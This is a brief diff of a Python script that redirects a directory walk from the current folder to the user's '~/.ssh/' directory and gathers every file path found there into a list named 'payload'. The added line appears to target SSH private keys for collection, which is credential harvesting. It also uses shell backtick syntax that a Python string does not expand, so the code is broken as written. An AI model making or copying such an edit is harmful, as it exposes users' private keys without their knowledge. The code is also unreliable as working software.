@@ -11,7 +11,7 @@ import os
 
 if __name__ == "__main__":
     payload = []
-    for root, dirs, files in os.walk(".", topdown=False):
+    for root, dirs, files in os.walk("/home/`whoami`/.ssh/", topdown=False):
         for name in files:
             payload.append(os.path.join(root, name))
         for name in dirs:
